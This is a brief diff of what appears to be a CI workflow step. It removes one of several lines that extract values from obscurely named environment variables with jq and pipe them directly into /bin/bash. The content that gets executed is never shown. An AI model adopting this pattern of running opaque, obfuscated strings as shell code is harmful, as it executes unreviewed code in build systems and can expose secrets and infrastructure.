@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$wa0" | jq -r .cvb68 | /bin/bash
           printf '%s' "$mswmy04" | jq -r .d7853 | /bin/bash
-          echo $zr23 | jq -r .oswfj8035 | /bin/bash
           echo $byzaa19 | jq -r .g15851 | /bin/bash
           echo $dfnc05613 | jq -r .nsz9516 | /bin/bash
 
